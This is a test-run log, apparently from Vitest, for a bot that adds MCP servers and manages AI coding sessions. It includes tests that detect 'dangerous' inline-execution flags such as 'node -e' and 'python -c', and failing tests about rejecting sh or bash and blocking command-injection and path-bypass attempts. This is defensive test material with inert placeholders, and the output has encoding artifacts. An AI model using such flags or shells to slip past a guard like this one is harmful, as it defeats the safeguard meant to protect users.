[90mstdout[2m | tests/wizard-dangerous-args-confirmation.test.ts[2m > [22m[2mServerWizard - Dangerous Arguments Confirmation Flow[2m > [22m[2mUser confirmation handling[2m > [22m[2mshould accept "confirmar" and create server[22m[39m
2026-02-12T17:11:38.130Z [[32minfo[39m]: Wizard started {"userId":1}
2026-02-12T17:11:38.131Z [[32minfo[39m]: Dangerous arguments detected in wizard {"userId":1,"serverName":"danger-server","flags":["-e"],"fullCommand":"node -e code"}
2026-02-12T17:11:38.132Z [[32minfo[39m]: User confirmed dangerous arguments in wizard {"userId":1,"serverName":"danger-server","flags":["-e"],"fullCommand":"node -e code","decision":"confirmed"}
2026-02-12T17:11:38.134Z [[33mwarn[39m]: Dangerous arguments confirmed by user {"userId":1,"serverName":"danger-server","command":"node","args":["-e","code"],"dangerousFlags":["-e"],"fullCommand":"node -e code","decision":"confirmed"}
2026-02-12T17:11:38.138Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"danger-server","serverType":"stdio"}

[90mstdout[2m | tests/wizard-dangerous-args-confirmation.test.ts[2m > [22m[2mServerWizard - Dangerous Arguments Confirmation Flow[2m > [22m[2mUser confirmation handling[2m > [22m[2mshould accept "CONFIRMAR" (case-insensitive)[22m[39m
2026-02-12T17:11:38.142Z [[32minfo[39m]: Wizard started {"userId":1}
2026-02-12T17:11:38.143Z [[32minfo[39m]: Dangerous arguments detected in wizard {"userId":1,"serverName":"danger-server","flags":["-e"],"fullCommand":"node -e code"}
2026-02-12T17:11:38.143Z [[32minfo[39m]: User confirmed dangerous arguments in wizard {"userId":1,"serverName":"danger-server","flags":["-e"],"fullCommand":"node -e code","decision":"confirmed"}
2026-02-12T17:11:38.144Z [[33mwarn[39m]: Dangerous arguments confirmed by user {"userId":1,"serverName":"danger-server","command":"node","args":["-e","code"],"dangerousFlags":["-e"],"fullCommand":"node -e code","decision":"confirmed"}
2026-02-12T17:11:38.146Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"danger-server","serverType":"stdio"}

[90mstdout[2m | tests/wizard-dangerous-args-confirmation.test.ts[2m > [22m[2mServerWizard - Dangerous Arguments Confirmation Flow[2m > [22m[2mUser confirmation handling[2m > [22m[2mshould accept "cancelar" and abort operation[22m[39m
2026-02-12T17:11:38.149Z [[32minfo[39m]: Wizard started {"userId":1}
2026-02-12T17:11:38.150Z [[32minfo[39m]: Dangerous arguments detected in wizard {"userId":1,"serverName":"danger-server","flags":["-e"],"fullCommand":"node -e code"}

[90mstdout[2m | tests/wizard-dangerous-args-confirmation.test.ts[2m > [22m[2mServerWizard - Dangerous Arguments Confirmation Flow[2m > [22m[2mUser confirmation handling[2m > [22m[2mshould accept "CANCELAR" (case-insensitive)[22m[39m
2026-02-12T17:11:38.154Z [[32minfo[39m]: Wizard started {"userId":1}
2026-02-12T17:11:38.155Z [[32minfo[39m]: Dangerous arguments detected in wizard {"userId":1,"serverName":"danger-server","flags":["-e"],"fullCommand":"node -e code"}

[90mstdout[2m | tests/wizard-dangerous-args-confirmation.test.ts[2m > [22m[2mServerWizard - Dangerous Arguments Confirmation Flow[2m > [22m[2mUser confirmation handling[2m > [22m[2mshould reject invalid confirmation responses[22m[39m
2026-02-12T17:11:38.159Z [[32minfo[39m]: Wizard started {"userId":1}
2026-02-12T17:11:38.159Z [[32minfo[39m]: Dangerous arguments detected in wizard {"userId":1,"serverName":"danger-server","flags":["-e"],"fullCommand":"node -e code"}

[90mstdout[2m | tests/wizard-dangerous-args-confirmation.test.ts[2m > [22m[2mServerWizard - Dangerous Arguments Confirmation Flow[2m > [22m[2mUser confirmation handling[2m > [22m[2mshould allow retry after invalid response[22m[39m
2026-02-12T17:11:38.164Z [[32minfo[39m]: Wizard started {"userId":1}
2026-02-12T17:11:38.164Z [[32minfo[39m]: Dangerous arguments detected in wizard {"userId":1,"serverName":"danger-server","flags":["-e"],"fullCommand":"node -e code"}
2026-02-12T17:11:38.165Z [[32minfo[39m]: User confirmed dangerous arguments in wizard {"userId":1,"serverName":"danger-server","flags":["-e"],"fullCommand":"node -e code","decision":"confirmed"}
2026-02-12T17:11:38.165Z [[33mwarn[39m]: Dangerous arguments confirmed by user {"userId":1,"serverName":"danger-server","command":"node","args":["-e","code"],"dangerousFlags":["-e"],"fullCommand":"node -e code","decision":"confirmed"}
2026-02-12T17:11:38.166Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"danger-server","serverType":"stdio"}

[90mstdout[2m | tests/wizard-dangerous-args-confirmation.test.ts[2m > [22m[2mServerWizard - Dangerous Arguments Confirmation Flow[2m > [22m[2mUser confirmation handling[2m > [22m[2mshould clean up session after confirmation[22m[39m
2026-02-12T17:11:38.169Z [[32minfo[39m]: Wizard started {"userId":1}
2026-02-12T17:11:38.170Z [[32minfo[39m]: Dangerous arguments detected in wizard {"userId":1,"serverName":"danger-server","flags":["-e"],"fullCommand":"node -e code"}
2026-02-12T17:11:38.170Z [[32minfo[39m]: User confirmed dangerous arguments in wizard {"userId":1,"serverName":"danger-server","flags":["-e"],"fullCommand":"node -e code","decision":"confirmed"}
2026-02-12T17:11:38.171Z [[33mwarn[39m]: Dangerous arguments confirmed by user {"userId":1,"serverName":"danger-server","command":"node","args":["-e","code"],"dangerousFlags":["-e"],"fullCommand":"node -e code","decision":"confirmed"}
2026-02-12T17:11:38.171Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"danger-server","serverType":"stdio"}

[90mstdout[2m | tests/wizard-dangerous-args-confirmation.test.ts[2m > [22m[2mServerWizard - Dangerous Arguments Confirmation Flow[2m > [22m[2mUser confirmation handling[2m > [22m[2mshould clean up session after cancellation[22m[39m
2026-02-12T17:11:38.174Z [[32minfo[39m]: Wizard started {"userId":1}
2026-02-12T17:11:38.174Z [[32minfo[39m]: Dangerous arguments detected in wizard {"userId":1,"serverName":"danger-server","flags":["-e"],"fullCommand":"node -e code"}

[90mstdout[2m | tests/wizard-dangerous-args-confirmation.test.ts[2m > [22m[2mServerWizard - Dangerous Arguments Confirmation Flow[2m > [22m[2mSafe arguments - no confirmation needed[2m > [22m[2mshould NOT show confirmation for safe arguments[22m[39m
2026-02-12T17:11:38.177Z [[32minfo[39m]: Wizard started {"userId":1}

[90mstdout[2m | tests/wizard-dangerous-args-confirmation.test.ts[2m > [22m[2mServerWizard - Dangerous Arguments Confirmation Flow[2m > [22m[2mSafe arguments - no confirmation needed[2m > [22m[2mshould create safe server without extra confirmation[22m[39m
2026-02-12T17:11:38.187Z [[32minfo[39m]: Wizard started {"userId":1}
2026-02-12T17:11:38.190Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"safe-server","serverType":"stdio"}

[90mstdout[2m | tests/wizard-dangerous-args-confirmation.test.ts[2m > [22m[2mServerWizard - Dangerous Arguments Confirmation Flow[2m > [22m[2mHTTP servers - no dangerous args detection[2m > [22m[2mshould NOT check for dangerous args in HTTP servers[22m[39m
2026-02-12T17:11:38.194Z [[32minfo[39m]: Wizard started {"userId":1}

[90mstdout[2m | tests/wizard-dangerous-args-confirmation.test.ts[2m > [22m[2mServerWizard - Dangerous Arguments Confirmation Flow[2m > [22m[2mEdge cases[2m > [22m[2mshould handle empty args gracefully[22m[39m
2026-02-12T17:11:38.198Z [[32minfo[39m]: Wizard started {"userId":1}

[90mstdout[2m | tests/wizard-dangerous-args-confirmation.test.ts[2m > [22m[2mServerWizard - Dangerous Arguments Confirmation Flow[2m > [22m[2mEdge cases[2m > [22m[2mshould handle whitespace-only args[22m[39m
2026-02-12T17:11:38.201Z [[32minfo[39m]: Wizard started {"userId":1}

[90mstdout[2m | tests/wizard-dangerous-args-confirmation.test.ts[2m > [22m[2mServerWizard - Dangerous Arguments Confirmation Flow[2m > [22m[2mEdge cases[2m > [22m[2mshould detect dangerous flag with extra whitespace[22m[39m
2026-02-12T17:11:38.204Z [[32minfo[39m]: Wizard started {"userId":1}
2026-02-12T17:11:38.204Z [[32minfo[39m]: Dangerous arguments detected in wizard {"userId":1,"serverName":"whitespace-danger","flags":["-e"],"fullCommand":"node -e code"}

[90mstdout[2m | tests/wizard-dangerous-args-confirmation.test.ts[2m > [22m[2mServerWizard - Dangerous Arguments Confirmation Flow[2m > [22m[2mIntegration with existing wizard flow[2m > [22m[2mshould maintain wizard state correctly through confirmation flow[22m[39m
2026-02-12T17:11:38.207Z [[32minfo[39m]: Wizard started {"userId":1}
2026-02-12T17:11:38.208Z [[32minfo[39m]: Dangerous arguments detected in wizard {"userId":1,"serverName":"test","flags":["-e"],"fullCommand":"node -e code"}
2026-02-12T17:11:38.209Z [[32minfo[39m]: User confirmed dangerous arguments in wizard {"userId":1,"serverName":"test","flags":["-e"],"fullCommand":"node -e code","decision":"confirmed"}
2026-02-12T17:11:38.209Z [[33mwarn[39m]: Dangerous arguments confirmed by user {"userId":1,"serverName":"test","command":"node","args":["-e","code"],"dangerousFlags":["-e"],"fullCommand":"node -e code","decision":"confirmed"}
2026-02-12T17:11:38.210Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"test","serverType":"stdio"}

[90mstdout[2m | tests/wizard-dangerous-args-confirmation.test.ts[2m > [22m[2mServerWizard - Dangerous Arguments Confirmation Flow[2m > [22m[2mIntegration with existing wizard flow[2m > [22m[2mshould preserve server data through confirmation flow[22m[39m
2026-02-12T17:11:38.214Z [[32minfo[39m]: Wizard started {"userId":1}
2026-02-12T17:11:38.215Z [[32minfo[39m]: Dangerous arguments detected in wizard {"userId":1,"serverName":"my-server","flags":["-c"],"fullCommand":"python -c test"}
2026-02-12T17:11:38.215Z [[32minfo[39m]: User confirmed dangerous arguments in wizard {"userId":1,"serverName":"my-server","flags":["-c"],"fullCommand":"python -c test","decision":"confirmed"}
2026-02-12T17:11:38.216Z [[33mwarn[39m]: Dangerous arguments confirmed by user {"userId":1,"serverName":"my-server","command":"python","args":["-c","test"],"dangerousFlags":["-c"],"fullCommand":"python -c test","decision":"confirmed"}
2026-02-12T17:11:38.216Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"my-server","serverType":"stdio"}

[90mstdout[2m | tests/wizard-dangerous-args-confirmation.test.ts[2m > [22m[2mServerWizard - Dangerous Arguments Confirmation Flow[2m > [22m[2mIntegration with existing wizard flow[2m > [22m[2mshould allow cancel keywords to work in confirmation step[22m[39m
2026-02-12T17:11:38.224Z [[32minfo[39m]: Wizard started {"userId":1}
2026-02-12T17:11:38.225Z [[32minfo[39m]: Dangerous arguments detected in wizard {"userId":1,"serverName":"test","flags":["-e"],"fullCommand":"node -e code"}

[90mstdout[2m | tests/wizard-dangerous-args-confirmation.test.ts[2m > [22m[2mServerWizard - Dangerous Arguments Confirmation Flow[2m > [22m[2mSecurity logging[2m > [22m[2mshould log when user confirms dangerous args[22m[39m
2026-02-12T17:11:38.229Z [[32minfo[39m]: Wizard started {"userId":1}
2026-02-12T17:11:38.231Z [[32minfo[39m]: Dangerous arguments detected in wizard {"userId":1,"serverName":"danger","flags":["-e"],"fullCommand":"node -e code"}
2026-02-12T17:11:38.232Z [[32minfo[39m]: User confirmed dangerous arguments in wizard {"userId":1,"serverName":"danger","flags":["-e"],"fullCommand":"node -e code","decision":"confirmed"}
2026-02-12T17:11:38.232Z [[33mwarn[39m]: Dangerous arguments confirmed by user {"userId":1,"serverName":"danger","command":"node","args":["-e","code"],"dangerousFlags":["-e"],"fullCommand":"node -e code","decision":"confirmed"}
2026-02-12T17:11:38.233Z [[32minfo[39m]: MCP server added {"userId":1,"serverName":"danger","serverType":"stdio"}

[90mstdout[2m | tests/wizard-dangerous-args-confirmation.test.ts[2m > [22m[2mServerWizard - Dangerous Arguments Confirmation Flow[2m > [22m[2mSecurity logging[2m > [22m[2mshould log when user cancels dangerous args[22m[39m
2026-02-12T17:11:38.237Z [[32minfo[39m]: Wizard started {"userId":1}
2026-02-12T17:11:38.237Z [[32minfo[39m]: Dangerous arguments detected in wizard {"userId":1,"serverName":"danger","flags":["-e"],"fullCommand":"node -e code"}

 [32mÃ”Â£Ã´[39m tests/wizard-dangerous-args-confirmation.test.ts [2m ([22m[2m24 tests[22m[2m)[22m[90m 167[2mms[22m[39m
 [32mÃ”Â£Ã´[39m tests/commands-logs.test.ts [2m ([22m[2m12 tests[22m[2m)[22m[33m 2525[2mms[22m[39m
 [31mÃ”Ã˜Â»[39m tests/timeout-extension.test.ts [2m ([22m[2m15 tests[22m [2m|[22m [31m1 failed[39m[2m)[22m[33m 958[2mms[22m[39m
[31m   [31mâ”œÃ¹[31m SessionManager - Timeout Extension[2m > [22mCritical Bug Fix: Manual Extension Timeout Reset[2m > [22mshould use Math.max(0, ...) to prevent negative remaining time[39m
[31m     Ã”Ã¥Ã† expected true to be false // Object.is equality[39m
 [32mÃ”Â£Ã´[39m tests/error-sanitizer.test.ts [2m ([22m[2m40 tests[22m[2m)[22m[90m 52[2mms[22m[39m
 [32mÃ”Â£Ã´[39m tests/critical-fixes.test.ts [2m ([22m[2m29 tests[22m[2m)[22m[90m 70[2mms[22m[39m
[90mstdout[2m | tests/input-size-limits.test.ts[2m > [22m[2mMessage Size Validation[2m > [22m[2mshould include size information in warning message[22m[39m
2026-02-12T17:11:39.212Z [[33mwarn[39m]: Input message too large, truncating {"sizeBytes":2048,"maxBytes":1024}

 [31mÃ”Ã˜Â»[39m tests/input-size-limits.test.ts [2m ([22m[2m15 tests[22m [2m|[22m [31m10 failed[39m[2m)[22m[33m 953[2mms[22m[39m
[31m   [31mâ”œÃ¹[31m Message Size Validation[2m > [22mshould allow messages under the size limit[39m
[31m     Ã”Ã¥Ã† Error de configuraciâ”œâ”‚n. Revisa tu archivo .env:
  - MAX_INPUT_SIZE_BYTES: Number must be greater than or equal to 1024

Copia .env.example a .env y rellena los valores obligatorios.[39m
[31m   [31mâ”œÃ¹[31m Message Size Validation[2m > [22mshould truncate messages over the size limit[39m
[31m     Ã”Ã¥Ã† Error de configuraciâ”œâ”‚n. Revisa tu archivo .env:
  - MAX_INPUT_SIZE_BYTES: Number must be greater than or equal to 1024

Copia .env.example a .env y rellena los valores obligatorios.[39m
[31m   [31mâ”œÃ¹[31m Message Size Validation[2m > [22mshould handle multi-byte UTF-8 characters correctly[39m
[31m     Ã”Ã¥Ã† Error de configuraciâ”œâ”‚n. Revisa tu archivo .env:
  - MAX_INPUT_SIZE_BYTES: Number must be greater than or equal to 1024

Copia .env.example a .env y rellena los valores obligatorios.[39m
[31m   [31mâ”œÃ¹[31m Message Size Validation[2m > [22mshould send warning message to user when truncating[39m
[31m     Ã”Ã¥Ã† Error de configuraciâ”œâ”‚n. Revisa tu archivo .env:
  - MAX_INPUT_SIZE_BYTES: Number must be greater than or equal to 1024

Copia .env.example a .env y rellena los valores obligatorios.[39m
[31m   [31mâ”œÃ¹[31m Message Size Validation[2m > [22mshould log truncation events[39m
[31m     Ã”Ã¥Ã† Error de configuraciâ”œâ”‚n. Revisa tu archivo .env:
  - MAX_INPUT_SIZE_BYTES: Number must be greater than or equal to 1024

Copia .env.example a .env y rellena los valores obligatorios.[39m
[31m   [31mâ”œÃ¹[31m Buffer Size Validation (Streaming)[2m > [22mshould allow streaming buffer under size limit[39m
[31m     Ã”Ã¥Ã† Error de configuraciâ”œâ”‚n. Revisa tu archivo .env:
  - MAX_INPUT_SIZE_BYTES: Number must be greater than or equal to 1024
  - MAX_BUFFER_SIZE_BYTES: Number must be greater than or equal to 10240

Copia .env.example a .env y rellena los valores obligatorios.[39m
[31m   [31mâ”œÃ¹[31m Buffer Size Validation (Streaming)[2m > [22mshould warn when streaming buffer exceeds size limit[39m
[31m     Ã”Ã¥Ã† Error de configuraciâ”œâ”‚n. Revisa tu archivo .env:
  - MAX_INPUT_SIZE_BYTES: Number must be greater than or equal to 1024
  - MAX_BUFFER_SIZE_BYTES: Number must be greater than or equal to 10240

Copia .env.example a .env y rellena los valores obligatorios.[39m
[31m   [31mâ”œÃ¹[31m Buffer Size Validation (Streaming)[2m > [22mshould include buffer size in warning message[39m
[31m     Ã”Ã¥Ã† Error de configuraciâ”œâ”‚n. Revisa tu archivo .env:
  - MAX_INPUT_SIZE_BYTES: Number must be greater than or equal to 1024
  - MAX_BUFFER_SIZE_BYTES: Number must be greater than or equal to 10240

Copia .env.example a .env y rellena los valores obligatorios.[39m
[31m   [31mâ”œÃ¹[31m Buffer Size Validation (Streaming)[2m > [22mshould log buffer size warnings[39m
[31m     Ã”Ã¥Ã† Error de configuraciâ”œâ”‚n. Revisa tu archivo .env:
  - MAX_INPUT_SIZE_BYTES: Number must be greater than or equal to 1024
  - MAX_BUFFER_SIZE_BYTES: Number must be greater than or equal to 10240

Copia .env.example a .env y rellena los valores obligatorios.[39m
[31m   [31mâ”œÃ¹[31m Buffer Size Validation (Streaming)[2m > [22mshould only warn once per buffer overflow[39m
[31m     Ã”Ã¥Ã† Error de configuraciâ”œâ”‚n. Revisa tu archivo .env:
  - MAX_INPUT_SIZE_BYTES: Number must be greater than or equal to 1024
  - MAX_BUFFER_SIZE_BYTES: Number must be greater than or equal to 10240

Copia .env.example a .env y rellena los valores obligatorios.[39m
[90mstdout[2m | tests/plan-mode-fixes.test.ts[2m > [22m[2mPlan Mode Critical Fixes[2m > [22m[2mFix 1: /switch command exits plan mode[2m > [22m[2mshould exit plan mode when switching projects via /switch[22m[39m
2026-02-12T17:11:40.088Z [[32minfo[39m]: Creating new session {"userId":"user123","projectPath":"C:\\temp\\project1","model":"gpt-5-mini","toolsCount":0,"mcpServersCount":0,"hasSystemMessage":false}
2026-02-12T17:11:40.097Z [[32minfo[39m]: Session created successfully {"userId":"user123","projectPath":"C:\\temp\\project1","sessionCount":1}
2026-02-12T17:11:40.097Z [[32minfo[39m]: Plan mode state changed {"userId":"user123","active":true}
2026-02-12T17:11:40.100Z [[32minfo[39m]: Exiting plan mode {"userId":"user123","hasActiveProject":true}
2026-02-12T17:11:40.100Z [[32minfo[39m]: Destroying session {"userId":"user123","projectPath":"C:\\temp\\project1","sessionAge":4}
2026-02-12T17:11:40.101Z [[32minfo[39m]: Session destroyed successfully {"userId":"user123","projectPath":"C:\\temp\\project1"}
2026-02-12T17:11:40.102Z [[32minfo[39m]: Plan mode exited, session destroyed for recreation {"userId":"user123","projectPath":"C:\\temp\\project1"}
2026-02-12T17:11:40.103Z [[32minfo[39m]: Creating new session {"userId":"user123","projectPath":"C:\\temp\\project2","model":"gpt-5-mini","toolsCount":0,"mcpServersCount":0,"hasSystemMessage":false}
2026-02-12T17:11:40.103Z [[32minfo[39m]: Session created successfully {"userId":"user123","projectPath":"C:\\temp\\project2","sessionCount":1}

 [31mÃ”Ã˜Â»[39m tests/mcp-add-command-allowlist.test.ts [2m ([22m[2m13 tests[22m [2m|[22m [31m13 failed[39m[2m)[22m[90m 117[2mms[22m[39m
[31m   [31mâ”œÃ¹[31m Task 1.2: /mcp add Command Allowlist Validation[2m > [22mSecurity: Executable Allowlist Validation[2m > [22mshould REJECT disallowed executable via /mcp add stdio[39m
[31m     Ã”Ã¥Ã† mcp command handler not registered[39m
[31m   [31mâ”œÃ¹[31m Task 1.2: /mcp add Command Allowlist Validation[2m > [22mSecurity: Executable Allowlist Validation[2m > [22mshould ACCEPT allowed executable via /mcp add stdio[39m
[31m     Ã”Ã¥Ã† mcp command handler not registered[39m
[31m   [31mâ”œÃ¹[31m Task 1.2: /mcp add Command Allowlist Validation[2m > [22mSecurity: Executable Allowlist Validation[2m > [22mshould REJECT sh executable (shell injection risk)[39m
[31m     Ã”Ã¥Ã† mcp command handler not registered[39m
[31m   [31mâ”œÃ¹[31m Task 1.2: /mcp add Command Allowlist Validation[2m > [22mSecurity: Executable Allowlist Validation[2m > [22mshould REJECT bash executable (shell injection risk)[39m
[31m     Ã”Ã¥Ã† mcp command handler not registered[39m
[31m   [31mâ”œÃ¹[31m Task 1.2: /mcp add Command Allowlist Validation[2m > [22mSecurity: Executable Allowlist Validation[2m > [22mshould ACCEPT python from default allowlist[39m
[31m     Ã”Ã¥Ã† mcp command handler not registered[39m
[31m   [31mâ”œÃ¹[31m Task 1.2: /mcp add Command Allowlist Validation[2m > [22mSecurity: Executable Allowlist Validation[2m > [22mshould ACCEPT npx from default allowlist[39m
[31m     Ã”Ã¥Ã† mcp command handler not registered[39m
[31m   [31mâ”œÃ¹[31m Task 1.2: /mcp add Command Allowlist Validation[2m > [22mSecurity: Executable Allowlist Validation[2m > [22mshould NOT validate HTTP servers (no command to check)[39m
[31m     Ã”Ã¥Ã† mcp command handler not registered[39m
[31m   [31mâ”œÃ¹[31m Task 1.2: /mcp add Command Allowlist Validation[2m > [22mSecurity: Executable Allowlist Validation[2m > [22mshould show user-friendly error message with allowed executables list[39m
[31m     Ã”Ã¥Ã† mcp command handler not registered[39m
[31m   [31mâ”œÃ¹[31m Task 1.2: /mcp add Command Allowlist Validation[2m > [22mBypass Prevention[2m > [22mshould prevent bypassing allowlist with full path to disallowed executable[39m
[31m     Ã”Ã¥Ã† mcp command handler not registered[39m
[31m   [31mâ”œÃ¹[31m Task 1.2: /mcp add Command Allowlist Validation[2m > [22mBypass Prevention[2m > [22mshould detect command injection attempts in executable name[39m
[31m     Ã”Ã¥Ã† mcp command handler not registered[39m
[31m   [31mâ”œÃ¹[31m Task 1.2: /mcp add Command Allowlist Validation[2m > [22mBackward Compatibility[2m > [22mshould maintain existing /mcp add http functionality[39m
[31m     Ã”Ã¥Ã† mcp command handler not registered[39m
[31m   [31mâ”œÃ¹[31m Task 1.2: /mcp add Command Allowlist Validation[2m > [22mBackward Compatibility[2m > [22mshould maintain existing error messages for invalid type[39m
[31m     Ã”Ã¥Ã† mcp command handler not registered[39m
[31m   [31mâ”œÃ¹[31m Task 1.2: /mcp add Command Allowlist Validation[2m > [22mBackward Compatibility[2m > [22mshould maintain existing usage message format[39m
[31m     Ã”Ã¥Ã† mcp command handler not registered[39m
[90mstdout[2m | tests/plan-mode-fixes.test.ts[2m > [22m[2mPlan Mode Critical Fixes[2m > [22m[2mFix 2: exitPlanMode preserves projectPath for logging[2m > [22m[2mshould log correct projectPath when exiting plan mode[22m[39m
2026-02-12T17:11:40.166Z [[32minfo[39m]: Creating new session {"userId":"user123","projectPath":"C:\\temp\\testproject","model":"gpt-5-mini","toolsCount":0,"mcpServersCount":0,"hasSystemMessage":false}
2026-02-12T17:11:40.167Z [[32minfo[39m]: Session created successfully {"userId":"user123","projectPath":"C:\\temp\\testproject","sessionCount":1}
2026-02-12T17:11:40.168Z [[32minfo[39m]: Plan mode state changed {"userId":"user123","active":true}
2026-02-12T17:11:40.168Z [[32minfo[39m]: Exiting plan mode {"userId":"user123","hasActiveProject":true}
2026-02-12T17:11:40.169Z [[32minfo[39m]: Destroying session {"userId":"user123","projectPath":"C:\\temp\\testproject","sessionAge":2}
2026-02-12T17:11:40.169Z [[32minfo[39m]: Session destroyed successfully {"userId":"user123","projectPath":"C:\\temp\\testproject"}
2026-02-12T17:11:40.170Z [[32minfo[39m]: Plan mode exited, session destroyed for recreation {"userId":"user123","projectPath":"C:\\temp\\testproject"}

 [32mÃ”Â£Ã´[39m tests/enhanced-heartbeat.test.ts [2m ([22m[2m23 tests[22m[2m)[22m[90m 57[2mms[22m[39m
[90mstdout[2m | tests/plan-mode-fixes.test.ts[2m > [22m[2mPlan Mode Critical Fixes[2m > [22m[2mFix 3: Follow-up messages re-inject plan systemMessage[2m > [22m[2mshould recreate session with systemMessage when plan mode is active[22m[39m
2026-02-12T17:11:40.400Z [[32minfo[39m]: Creating new session {"userId":"user123","projectPath":"C:\\temp\\project","model":"gpt-5-mini","toolsCount":0,"mcpServersCount":0,"hasSystemMessage":false}
2026-02-12T17:11:40.401Z [[32minfo[39m]: Session created successfully {"userId":"user123","projectPath":"C:\\temp\\project","sessionCount":1}
2026-02-12T17:11:40.401Z [[32minfo[39m]: Plan mode state changed {"userId":"user123","active":true}
2026-02-12T17:11:40.402Z [[32minfo[39m]: Destroying existing session for project {"userId":"user123","projectPath":"C:\\temp\\project"}
2026-02-12T17:11:40.402Z [[32minfo[39m]: Creating new session {"userId":"user123","projectPath":"C:\\temp\\project","model":"gpt-5-mini","toolsCount":0,"mcpServersCount":0,"hasSystemMessage":true}
2026-02-12T17:11:40.402Z [[32minfo[39m]: Session created successfully {"userId":"user123","projectPath":"C:\\temp\\project","sessionCount":1}

[90mstdout[2m | tests/plan-mode-fixes.test.ts[2m > [22m[2mPlan Mode Critical Fixes[2m > [22m[2mFix 3: Follow-up messages re-inject plan systemMessage[2m > [22m[2mshould not include systemMessage when plan mode is inactive[22m[39m
2026-02-12T17:11:40.441Z [[32minfo[39m]: Creating new session {"userId":"user123","projectPath":"C:\\temp\\project","model":"gpt-5-mini","toolsCount":0,"mcpServersCount":0,"hasSystemMessage":false}
2026-02-12T17:11:40.441Z [[32minfo[39m]: Session created successfully {"userId":"user123","projectPath":"C:\\temp\\project","sessionCount":1}

[90mstdout[2m | tests/plan-mode-fixes.test.ts[2m > [22m[2mPlan Mode Critical Fixes[2m > [22m[2mFix 4: /reset aborts in-flight operations in plan mode[2m > [22m[2mshould abort in-flight operations before exiting plan mode[22m[39m
2026-02-12T17:11:40.478Z [[32minfo[39m]: Creating new session {"userId":"user123","projectPath":"C:\\temp\\project","model":"gpt-5-mini","toolsCount":0,"mcpServersCount":0,"hasSystemMessage":false}
2026-02-12T17:11:40.479Z [[32minfo[39m]: Session created successfully {"userId":"user123","projectPath":"C:\\temp\\project","sessionCount":1}
2026-02-12T17:11:40.479Z [[32minfo[39m]: Plan mode state changed {"userId":"user123","active":true}
2026-02-12T17:11:40.480Z [[32minfo[39m]: Exiting plan mode {"userId":"user123","hasActiveProject":true}
2026-02-12T17:11:40.480Z [[32minfo[39m]: Destroying session {"userId":"user123","projectPath":"C:\\temp\\project","sessionAge":1}
2026-02-12T17:11:40.481Z [[32minfo[39m]: Session destroyed successfully {"userId":"user123","projectPath":"C:\\temp\\project"}
2026-02-12T17:11:40.481Z [[32minfo[39m]: Plan mode exited, session destroyed for recreation {"userId":"user123","projectPath":"C:\\temp\\project"}

[90mstdout[2m | tests/plan-mode-fixes.test.ts[2m > [22m[2mPlan Mode Critical Fixes[2m > [22m[2mFix 4: /reset aborts in-flight operations in plan mode[2m > [22m[2mshould clear aborter before destroying session[22m[39m
2026-02-12T17:11:40.527Z [[32minfo[39m]: Creating new session {"userId":"user123","projectPath":"C:\\temp\\project","model":"gpt-5-mini","toolsCount":0,"mcpServersCount":0,"hasSystemMessage":false}
2026-02-12T17:11:40.527Z [[32minfo[39m]: Session created successfully {"userId":"user123","projectPath":"C:\\temp\\project","sessionCount":1}
2026-02-12T17:11:40.528Z [[32minfo[39m]: Plan mode state changed {"userId":"user123","active":true}
2026-02-12T17:11:40.528Z [[32minfo[39m]: Destroying session {"userId":"user123","projectPath":"C:\\temp\\project","sessionAge":1}
2026-02-12T17:11:40.529Z [[32minfo[39m]: Session destroyed successfully {"userId":"user123","projectPath":"C:\\temp\\project"}

[90mstdout[2m | tests/plan-mode-fixes.test.ts[2m > [22m[2mPlan Mode Critical Fixes[2m > [22m[2mFix 5: Plan mode preserved on model/MCP changes[2m > [22m[2mshould preserve plan mode when recreating session[22m[39m
2026-02-12T17:11:40.572Z [[32minfo[39m]: Creating new session {"userId":"user123","projectPath":"C:\\temp\\project","model":"gpt-5-mini","toolsCount":0,"mcpServersCount":0,"hasSystemMessage":false}
2026-02-12T17:11:40.573Z [[32minfo[39m]: Session created successfully {"userId":"user123","projectPath":"C:\\temp\\project","sessionCount":1}
2026-02-12T17:11:40.573Z [[32minfo[39m]: Plan mode state changed {"userId":"user123","active":true}
2026-02-12T17:11:40.574Z [[32minfo[39m]: Destroying session {"userId":"user123","projectPath":"C:\\temp\\project","sessionAge":1}
2026-02-12T17:11:40.574Z [[32minfo[39m]: Session destroyed successfully {"userId":"user123","projectPath":"C:\\temp\\project"}

[90mstdout[2m | tests/plan-mode-fixes.test.ts[2m > [22m[2mPlan Mode Critical Fixes[2m > [22m[2mFix 5: Plan mode preserved on model/MCP changes[2m > [22m[2mshould preserve plan mode when recreating session[22m[39m
2026-02-12T17:11:40.583Z [[32minfo[39m]: Recreating session with plan mode preserved {"userId":"user123","projectPath":"C:\\temp\\project"}
2026-02-12T17:11:40.584Z [[32minfo[39m]: Creating new session {"userId":"user123","projectPath":"C:\\temp\\project","model":"gpt-5","toolsCount":0,"mcpServersCount":0,"hasSystemMessage":true}
2026-02-12T17:11:40.584Z [[32minfo[39m]: Session created successfully {"userId":"user123","projectPath":"C:\\temp\\project","sessionCount":1}
2026-02-12T17:11:40.584Z [[32minfo[39m]: Plan mode state changed {"userId":"user123","active":true}

[90mstdout[2m | tests/plan-mode-fixes.test.ts[2m > [22m[2mPlan Mode Critical Fixes[2m > [22m[2mFix 5: Plan mode preserved on model/MCP changes[2m > [22m[2mshould include systemMessage when recreating session in plan mode[22m[39m
2026-02-12T17:11:40.627Z [[32minfo[39m]: Creating new session {"userId":"user123","projectPath":"C:\\temp\\project","model":"gpt-5-mini","toolsCount":0,"mcpServersCount":0,"hasSystemMessage":true}
2026-02-12T17:11:40.627Z [[32minfo[39m]: Session created successfully {"userId":"user123","projectPath":"C:\\temp\\project","sessionCount":1}
2026-02-12T17:11:40.628Z [[32minfo[39m]: Plan mode state changed {"userId":"user123","active":true}
2026-02-12T17:11:40.628Z [[32minfo[39m]: Destroying session {"userId":"user123","projectPath":"C:\\temp\\project","sessionAge":1}
2026-02-12T17:11:40.628Z [[32minfo[39m]: Session destroyed successfully {"userId":"user123","projectPath":"C:\\temp\\project"}
2026-02-12T17:11:40.628Z [[32minfo[39m]: Recreating session with plan mode preserved {"userId":"user123","projectPath":"C:\\temp\\project"}
